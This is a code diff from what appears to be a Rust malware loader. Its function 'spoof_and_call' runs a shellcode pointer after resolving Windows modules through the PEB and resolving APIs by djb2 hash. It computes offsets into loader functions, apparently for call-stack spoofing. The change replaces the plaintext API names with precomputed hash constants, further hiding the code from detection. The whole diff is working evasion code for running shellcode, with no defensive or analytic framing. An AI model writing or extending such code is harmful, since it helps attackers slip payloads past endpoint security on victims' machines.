@@ -1,6 +1,7 @@
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
-    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::h;
 
     // Resolve module bases from PEB (no GetModuleHandle call-site string in import table)
     const NTDLL_H:  u32 = djb2_hash_lower(b"ntdll.dll");
@@ -12,11 +13,11 @@ pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
     let kbase = peb_get_module_base(KBASE_H);
 
     // Resolve function addresses by hash (no GetProcAddress or plaintext names)
-    let rts      = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"RtlUserThreadStart")) } else { None };
-    let btit     = if !k32.is_null()   { resolve_by_hash(k32,   djb2_hash(b"BaseThreadInitThunk")) } else { None };
-    let ldr      = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"LdrLoadDll")) } else { None };
-    let ldrp_ptr = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"LdrpLoadDll")) } else { None };
-    let llew     = if !kbase.is_null() { resolve_by_hash(kbase, djb2_hash(b"LoadLibraryExW")) } else { None };
+    let rts      = if !ntdll.is_null() { resolve_by_hash(ntdll, h::RTL_USR_THR) } else { None };
+    let btit     = if !k32.is_null()   { resolve_by_hash(k32,   h::K32_BTI) } else { None };
+    let ldr      = if !ntdll.is_null() { resolve_by_hash(ntdll, h::LDR_LOAD) } else { None };
+    let ldrp_ptr = if !ntdll.is_null() { resolve_by_hash(ntdll, h::LDRP_LOAD) } else { None };
+    let llew     = if !kbase.is_null() { resolve_by_hash(kbase, h::K32_LLEW) } else { None };
 
     let f1 = llew.map(|p| p as usize + 0x1B0).unwrap_or(0);
     let f2 = ldr.map(|p|  p as usize + 0x9F).unwrap_or(0);
